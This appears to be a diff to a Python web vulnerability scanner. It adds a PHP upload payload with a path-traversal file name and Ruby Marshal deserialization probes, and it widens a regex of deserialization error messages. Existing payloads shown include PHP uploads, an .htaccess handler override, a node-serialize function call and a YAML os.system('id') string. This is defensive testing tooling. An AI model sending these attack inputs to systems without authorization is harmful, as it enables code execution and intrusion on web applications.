@@ -960,6 +960,8 @@ def probe_upload(ctx: Context, url: str) -> dict:
          f"AddType application/x-httpd-php .{canary}txt"),
         ("ctype-spoof", f"{canary}.php", "image/jpeg",
          f"<?php /*{canary}*/ echo 'x'; ?>"),
+        ("name-traversal", f"../{canary}.php", "application/x-php",
+         f"<?php /*{canary}*/ echo 'x'; ?>"),
     ]
     results = []
     for name, fname, ctype, content in payloads:
@@ -972,6 +974,8 @@ def probe_upload(ctx: Context, url: str) -> dict:
                       up.get("body") or "")
         if m:
             entry["stored_path"] = m.group(1)
+            if ".." in m.group(1):
+                entry["traversal_path"] = True
             g = ctx.client.send("GET",
                                 urllib.parse.urljoin(url, m.group(1)),
                                 tool="probe_upload", note=f"fetch {name}")
@@ -1063,7 +1067,8 @@ _DESER_ERRORS = re.compile(
     r"ObjectInputStream|InvalidClassException|ClassNotFoundException|"
     r"StreamCorruptedException|unserialize|__wakeup|Unpickler|"
     r"pickle\.loads|cannot deserialize|SerializationException|"
-    r"yaml_parse|marshal\.load|BinaryFormatter|JsonSerializer",
+    r"yaml_parse|marshal\.load|incompatible marshal|dump format error|"
+    r"BinaryFormatter|JsonSerializer",
     re.I,
 )
 
@@ -1084,6 +1089,8 @@ def probe_deserialize(ctx: Context, url: str, param: str,
         ("node-serialize", '{"x":"_$$ND_FUNC$$_function(){return 1}()"}'),
         ("yaml-python", "!!python/object/apply:os.system ['id']"),
         ("dotnet-psobject", '{"$type":"System.Object"}'),
+        ("ruby-marshal-b64", "BAhvOg=="),   # \x04\x08o: - Marshal magic
+        ("ruby-marshal-raw", "\x04\x08o:"),
     ]
     hits = []
     for name, pl in payloads:
